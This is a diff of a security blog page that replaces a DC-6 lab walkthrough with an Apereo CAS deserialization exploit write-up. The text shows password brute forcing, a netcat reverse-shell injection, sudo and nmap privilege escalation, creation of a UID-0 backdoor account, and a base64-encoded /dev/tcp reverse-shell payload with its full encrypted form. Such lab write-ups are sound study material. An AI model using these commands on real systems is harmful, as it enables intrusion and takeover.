@@ -17,7 +17,7 @@
     <meta name="keywords" content="G00dddd">
 
 
-<title>DC-6 | G00d`s Blog</title>
+<title>Vulhub-6.ApereoCAS | G00d`s Blog</title>
 
 
 
@@ -390,7 +390,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">DC-6</h1>
+            <h1 class="post-title">Vulhub-6.ApereoCAS</h1>
             
                 <div class="post-meta">
                     
@@ -399,14 +399,14 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:06:26</a>
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:21:34</a>
                         </span>
                     
                     
                         <span class="post-category">
                     Category:
                             
-                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                                <a href="../categories/Vulhub/">Vulhub</a>
                             
                         </span>
                     
@@ -415,49 +415,16 @@
         </header>
 
         <div class="post-content">
-            <h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><p>第一步信息收集</p>
-<p><img src="/dc-6//1.png" alt="1"></p>
-<p>192.168.213.158</p>
-<p><img src="/dc-6//2.png" alt="2"></p>
-<p>Vi &#x2F;etc&#x2F;hosts 把重定向加上就行了</p>
-<p>接着扫目录发现跟之前打过的靶机有点像</p>
-<p><img src="/dc-6//3.png" alt="3"></p>
-<p><img src="/dc-6//4.png" alt="4"></p>
-<p>用wpscan(专门搜索wordpross漏洞)再看看</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a></p>
-<p><img src="/dc-6//5.png" alt="5"></p>
-<p>用wpscan枚举一下用户名</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> –enumerate u</p>
-<p><img src="/dc-6//6.png" alt="6"></p>
-<p>爆出几个账号,cat &gt; 1.txt 保存一下,然后wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> -U 1.txt -P rockyou.txt</p>
-<p><img src="/dc-6//7.png" alt="7"></p>
-<p>Url&#x2F;wp-login.php 登录后台发现activity monitor</p>
-<p>用searchsploit activity monitor</p>
-<p><img src="/dc-6//8.png" alt="8"></p>
-<p><img src="/dc-6//../../../../%E5%88%B7%E9%A2%98/%E6%9C%AC%E5%9C%B0/vulnhub/media/image9.png"><img src="/dc-6//9.png" alt="9">这里有命令执行,127.0.0.1|nc -e &#x2F;bin&#x2F;bash 192.168.213.137 9999</p>
-<p><img src="/dc-6//10.png" alt="10"></p>
-<p>拿到普通权限</p>
-<p>Python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
-<p>在主机内部找信息</p>
-<p><img src="/dc-6//11.png" alt="11"></p>
-<p>Ssh <a href="mailto:&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;">&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;</a></p>
-<p>提权</p>
-<p><img src="/dc-6//12.png" alt="12"></p>
-<p>我们发现当前账号对backups.sh读写操作</p>
-<p>把shell写入backups</p>
-<p>Echo “&#x2F;bin&#x2F;bash” &gt;&gt; backups.sh</p>
-<p>Sudo -u jens .&#x2F;backups.sh &#x2F;&#x2F;这里用jens执行backups</p>
-<p><img src="/dc-6//13.png" alt="13"></p>
-<p>发现切换账号成功</p>
-<p>Sudo -l发现jens可以用root执行nmap,那就用nmap提权</p>
-<p><img src="/dc-6//14.png" alt="14"></p>
-<p>需要先看nmap的版本号 nmap -v</p>
-<p>然后把shell写入”shell”里,用nmap执行</p>
-<p>echo ‘os.execute(“&#x2F;bin&#x2F;sh”)’ &gt; shell</p>
-<p>sudo nmap –script&#x3D;shell</p>
-<p><img src="/dc-6//15.png" alt="15"></p>
-<p>添加root账号</p>
-<p>useradd -u 0 -o -g 0 -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;root1-m root1</p>
+            <h1 id="Apereo-CAS"><a href="#Apereo-CAS" class="headerlink" title="Apereo CAS"></a>Apereo CAS</h1><h2 id="4-1-反序列化命令执行漏洞"><a href="#4-1-反序列化命令执行漏洞" class="headerlink" title="4.1 反序列化命令执行漏洞"></a>4.1 反序列化命令执行漏洞</h2><p>Apereo CAS &lt;&#x3D; 4.1.7</p>
+<p>Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。Apereo CAS存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p>
+<p><img src="/vulhub-6-apereocas//1.png" alt="1"></p>
+<p>漏洞原理实际上是Webflow中使用了默认密钥changeit</p>
+<p>我们使用Apereo-CAS-Attack来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload：</p>
+<p>D:\Java_8_win\bin\java.exe -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNC80NDQ0IDA+JjE&#x3D;}|{base64,-d}|{bash,-i}”</p>
+<p>655bf119-177e-4506-899d-7727f753d9a7_AAAAIgAAABAbvW%2FcWnRvUG%2BtlQTg1pyKAAAABmFlczEyONeh98uAH8tyiqKR5mUaPfLJ1NMr2AuntaX7RKzT3ObU2ybHtK%2BK0D3ogVsvKGHnXWP9StQRlFl9av6XG%2FmGRvqDMC56Gd2aMj3LWnEh6tsafcrBK9SXLwjH8UKE5AB%2F25R5WFnVk8DBEBwvAq%2F0r1ie%2FLQyVc9Z1Zi1ecZXZ8%2FcfMK8rF0eU%2Fo06c2ohO%2FIrTkj5Bhcj80WsWpv4shSdqNXXhEyvTYCMlEwg5URtYq%2B%2FCeWo5JP9vQUw1xlGRRxuOHMQ2wrk72lHneeTfWnBR4r21398TyngVGnWgw2f8mwTfXJ9COHsDB2KMOYOKcC0E4Yxl7E0oWSa%2BLQcde1n4YKrGdnx9wwZZEeJJQOlYsNswaubVhAXvzsYZ83g43PJACWu4xGoOiuWgelqQgZjefV542%2FwgDhJ1Ek7ty2gXQlrqhIDE%2FAQGGtKDZEsDf0VhtHxq2iiqu8VxYNnxh4%2FBg0%2Fe1v3hUb1d6hZyW4fy5u2Bojvf%2F%2Fy2WmOOEIfW1ZcE%2FvJ14ipFQAY%2FHW71YlrkBbKXbGSzQnRC%2FIY6KyDE84kaSav4cBgxcGBYYzrkh%2BotljsU1xqZoo%2Bg80zp6a%2Ft%2BX6gEkSAp%2F7T20KBmqqBibCEgiVKDXPkd8C4nUjBnOZtO42rDRCodY1UgseA6fvocwZUTKsU%2FRUVu4QdnqWASRbPad2RR6O7TgNOWmrDmWDtmw5MNrVrn03pCM6aJHzCE5XdWGi6Mm1%2FmYnij3yWBN8yP23BJpxjSwimIy%2BLzT6q8IPXcFV2u%2FX%2BFVV2oJp7bwM6KFn8YeYUZDMDB8GPW%2F9jJjm7p6I1448N8hZiswcoseIBWA5KQqI%2FDTNXGzA%2B4A9aMRui17G3N4p4VkjhJOVyy8uinxJh%2FVXpOcCbUBFoa8zKGS6%2BJ8LpY%2BZCULHZjH2dbBXHE5eg4PljOWD%2FatoMmHkeRwtbjqH1fxFY%2BK5lLjoL2Egd3cXiNRJcEf0lfOgHtUPDZDSsMcQdkfYVjxLZfCb88Vv1YdU7V8cDJa7HrWhQNFv8LatrMwreZlHKQRuMLxZsSr3sB4vDjCs6llGTt9Qhv9xn3Aq%2F1xlImArstDFbd5kAAgbenhb8yrvhY6OA%2BvbfPb%2B%2F179TCeNXn8WH5HE5%2BkxgsXxMkIlMl79IXJ0YzNY9DWwnvrYL%2F4b1BLJ2MLsWFL6u9cfe%2B6qYEC0tZyI35fEzwEgvF1N3mOsmyT2EQj4TErV6%2B6yt5BQHc2rMjpoKwN2V4qhMBfQONoQtr4gZi6oUVa6JND5UxEIJntnzdH9%2F2ZGxDg6EmQIURLd9KdrksseSWhoztb5jz6Rvngh0W%2B%2FPeYODbi4xmJZJi2DG4yje1vkX6ODvLmRSjp%2Flb9s75DT29vp2ee5JEH49AglZ0Hh2uXKY9KUFc3ocbbsthqBTaqxlKe12kIKJdrnPi6A9C943C0eb%2B%2FdqGehPMudrmJ5veCbKo65Pu5AR%2BiyH6dm8VXqoYolozI3cu44CMCFQtP1ukeKBrQPxul4JmzfNzITbfx6IBZIFn1DhR4DKcQ0dhlj6ObYHbn0FBZicqOV%2FasCBYsRZkk%2B7MHilDSwQvHsEOcuTCcIJksy21rqOgySJlxMNugSddcuZHxGZruapdSOTV3iNTxM4GE0InyJiD34TlcT%2BsjjUsMQe0n0DVeoXBynBQDmlKmK7%2FIQffTgv3NZrBpzhN6XRmVP3xM%2FBfI8a9fzwFaul33s3ts%2FBNEFTq9AHD%2BUgn6z7L%2BqkIxt6FYpnbYZMsLBpg6aoX3J84ZN8kKqkfhtpgI9UDK0CzkRS1njn2QkviUInh9vS8FkjVyzS%2B%2Fiw0knj9JbQr0Tk2qWH4D8hIghQAwxD84fIpTfCGMJrQzC17LIPN9OktsZqPh%2FqQR%2Fou4PL1w3TU3czzCWsIOtntlt1V%2BPdWORcBk3aWfTuZb1dCfoRmL87cEh8omsGRWlg6YeULNXic6pxQQXZf290OjI0Z9oWAXlZ%2BOuqMyYfIpXuEAbF0EhT8HBFDtlM8pQFrSU23jTCcNUE%2BL%2FBsCOzr3IIMmEc%2F76B6L2sVDsOajRQuzkvk%3D</p>
+<p>然后我们登录CAS并抓包，将Body中的execution值替换</p>
+<p><img src="/vulhub-6-apereocas//2.png"><img src="/vulhub-6-apereocas//3.png" alt="3"></p>
+<p><img src="/vulhub-6-apereocas//4.png" alt="4">拿到反弹shell</p>
 
         </div>
 
@@ -494,10 +461,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="../dc-7/">DC-7</a>
+                <a class="prev" rel="prev" href="../vulhub-7-apacheapisix/">Vulhub-7.ApacheAPISIX</a>
             
             
-            <a class="next" rel="next" href="../dc-5/">DC-5</a>
+            <a class="next" rel="next" href="../vulhub-5-apache-druid/">Vulhub-5.apache-druid</a>
             
         </section>
 
